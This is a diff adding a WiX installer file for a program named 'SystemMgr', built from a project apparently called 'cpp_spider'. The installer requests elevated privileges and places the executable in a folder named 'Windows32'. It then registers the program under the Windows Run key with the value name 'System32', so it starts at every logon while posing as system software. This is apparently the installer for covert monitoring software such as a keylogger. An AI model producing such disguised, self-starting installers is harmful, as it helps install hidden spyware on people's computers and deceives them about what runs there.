@@ -1,0 +1,48 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+	<Product Id="*" Name="SystemMgr" Language="1033" Version="1.0.0.0" Manufacturer="CykaBlyat" UpgradeCode="88a47b0b-ef63-42b9-91e5-49662a94268c">
+		<Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" InstallPrivileges="elevated" />
+
+		<MajorUpgrade DowngradeErrorMessage="A newer version of SystemMgr is already installed." />
+    <Media Id="1" Cabinet='product.cab' EmbedCab='yes' />
+
+		<Feature Id="ProductFeature" Title="SystemMgr" Level="1">
+			<ComponentGroupRef Id="ProductComponents" />
+		</Feature>
+	</Product>
+
+	<Fragment>
+		<Directory Id="TARGETDIR" Name="SourceDir">
+			<Directory Id="ProgramFilesFolder">
+				<Directory Id="INSTALLFOLDER" Name="Windows32" />
+			</Directory>
+		</Directory>
+  </Fragment>
+  
+  <Fragment>
+		<ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER">
+
+      <Component Id="Product">
+        <File Source="C:\Users\Raph\cpp_spider\Client\Release\SystemMgr.exe" />
+      </Component>
+      
+      <Component Id="ProductCertif">
+        <File Source="C:\Users\Raph\cpp_spider\Client\Release\rootCA.pem" />
+      </Component>
+ 
+      <Component Id="ProductUninst">
+        <File Source="C:\Users\Raph\cpp_spider\Client\Client\Uninstaller\Release\Uninstaller.exe" />
+      </Component>
+
+      
+      <Component Id="RegistryEntries" Guid="C5EBFC6B-C087-4FCD-B090-8A952E3B9BD2">
+        <RegistryKey Root="HKCU"
+                     Key="Software\Microsoft\Windows\CurrentVersion\Run"
+                     Action="createAndRemoveOnUninstall">
+          <RegistryValue Type="string" Name="System32" Value="$(env.programfiles(x86))\Windows32\SystemMgr.exe"/>
+        </RegistryKey>
+      </Component>
+      
+    </ComponentGroup>
+	</Fragment>
+</Wix>
